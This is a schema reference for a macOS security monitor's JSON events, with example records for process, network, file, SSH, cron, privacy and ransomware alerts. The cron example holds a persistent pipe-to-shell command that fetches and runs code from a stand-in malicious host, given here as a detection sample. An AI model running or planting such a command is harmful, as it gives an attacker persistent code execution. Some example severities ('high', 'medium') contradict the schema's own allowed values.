# MacGuardian JSON Event Schema

## Standard Event Format

All modules (watchers, auditors, detectors) must emit events in this standardized format:

```json
{
  "timestamp": "2024-01-15T10:30:45.123Z",
  "type": "process|network|fs|ids|ssh|cron|privacy|ransomware|signature",
  "severity": "info|warning|critical",
  "source": "process_watcher|network_watcher|fsevents_watcher|ids_engine|ssh_auditor|cron_auditor|tcc_auditor|ransomware_detector|signature_engine",
  "message": "Human-readable description of the event",
  "context": {
    // Module-specific context data
  }
}
```

## Field Definitions

### timestamp
- **Type**: String (ISO 8601 format)
- **Format**: `YYYY-MM-DDTHH:MM:SS.sssZ`
- **Required**: Yes
- **Example**: `"2024-01-15T10:30:45.123Z"`

### type
- **Type**: String (enum)
- **Values**: 
  - `process` - Process-related events
  - `network` - Network connection events
  - `fs` or `filesystem` - File system events
  - `ids` or `correlation` - IDS correlation alerts
  - `ssh` - SSH security events
  - `cron` - Cron job events
  - `privacy` or `tcc_privacy` - Privacy/TCC events
  - `ransomware` - Ransomware detection
  - `signature` - Signature-based detection
- **Required**: Yes

### severity
- **Type**: String (enum)
- **Values**: `info`, `warning`, `critical`
- **Required**: Yes
- **Guidelines**:
  - `info`: Normal operations, baseline changes
  - `warning`: Suspicious activity, anomalies
  - `critical`: Security incidents, immediate threats

### source
- **Type**: String
- **Required**: Yes
- **Values**: Module name (e.g., `process_watcher`, `ssh_auditor`)

### message
- **Type**: String
- **Required**: Yes
- **Description**: Human-readable event description

### context
- **Type**: Object
- **Required**: Yes (can be empty object `{}`)
- **Description**: Module-specific data

## Module-Specific Context Schemas

### Process Events (`type: "process"`)

```json
{
  "timestamp": "...",
  "type": "process",
  "severity": "high",
  "source": "process_watcher",
  "message": "High CPU process detected",
  "context": {
    "pid": 12345,
    "process": "suspicious_app",
    "cpu_percent": 85.5,
    "memory_mb": 512,
    "command": "/path/to/app"
  }
}
```

### Network Events (`type: "network"`)

```json
{
  "timestamp": "...",
  "type": "network",
  "severity": "medium",
  "source": "network_watcher",
  "message": "Connection to unknown host",
  "context": {
    "pid": 12345,
    "process": "curl",
    "local_ip": "192.168.1.100",
    "local_port": 54321,
    "remote_ip": "1.2.3.4",
    "remote_port": 80,
    "protocol": "tcp"
  }
}
```

### File System Events (`type: "fs"`)

```json
{
  "timestamp": "...",
  "type": "fs",
  "severity": "medium",
  "source": "fsevents_watcher",
  "message": "Multiple file changes detected",
  "context": {
    "directory": "/Users/username/Documents",
    "file_count": 15,
    "files": ["file1.txt", "file2.txt"],
    "action": "modified"
  }
}
```

### IDS Events (`type: "ids"`)

```json
{
  "timestamp": "...",
  "type": "ids",
  "severity": "critical",
  "source": "ids_engine",
  "message": "Multiple suspicious activities detected simultaneously",
  "context": {
    "rule": "Multiple Suspicious Activities",
    "file_changes": 5,
    "new_processes": 2,
    "network_connections": 3,
    "time_window": 60
  }
}
```

### SSH Events (`type: "ssh"`)

```json
{
  "timestamp": "...",
  "type": "ssh",
  "severity": "warning",
  "source": "ssh_auditor",
  "message": "SSH config file modified",
  "context": {
    "file": "/Users/username/.ssh/config",
    "change_type": "modified",
    "baseline_hash": "abc123...",
    "current_hash": "def456..."
  }
}
```

### Cron Events (`type: "cron"`)

```json
{
  "timestamp": "...",
  "type": "cron",
  "severity": "high",
  "source": "cron_auditor",
  "message": "Suspicious cron job detected",
  "context": {
    "job": "*/5 * * * * curl http://malicious.com | bash",
    "user": "username",
    "pattern": "downloads_from_internet"
  }
}
```

### Privacy Events (`type: "privacy"`)

```json
{
  "timestamp": "...",
  "type": "privacy",
  "severity": "warning",
  "source": "tcc_auditor",
  "message": "New privacy permission granted",
  "context": {
    "app": "com.example.app",
    "service": "kTCCServiceFullDiskAccess",
    "allowed": true
  }
}
```

### Ransomware Events (`type: "ransomware"`)

```json
{
  "timestamp": "...",
  "type": "ransomware",
  "severity": "critical",
  "source": "ransomware_detector",
  "message": "Potential ransomware activity detected",
  "context": {
    "file_changes": 150,
    "encryption_patterns": 5,
    "time_window": 60
  }
}
```

## Validation

All events must:
1. Include all required fields
2. Use valid enum values for `type` and `severity`
3. Have valid ISO 8601 timestamp
4. Have non-empty `message` field
5. Have `context` as an object (can be empty)

## Event Bus Normalization

The Event Bus (`event_bus.py`) automatically normalizes events from various sources to this schema. Modules can emit slightly different formats, and the bus will normalize them.

## Examples

### Minimal Valid Event
```json
{
  "timestamp": "2024-01-15T10:30:45Z",
  "type": "process",
  "severity": "info",
  "source": "process_watcher",
  "message": "Process started",
  "context": {}
}
```

### Full Event
```json
{
  "timestamp": "2024-01-15T10:30:45.123Z",
  "type": "ids",
  "severity": "critical",
  "source": "ids_engine",
  "message": "Multiple suspicious activities detected simultaneously",
  "context": {
    "rule": "Multiple Suspicious Activities",
    "file_changes": 5,
    "new_processes": 2,
    "network_connections": 3,
    "time_window": 60,
    "incident_id": "inc_abc123"
  }
}
```

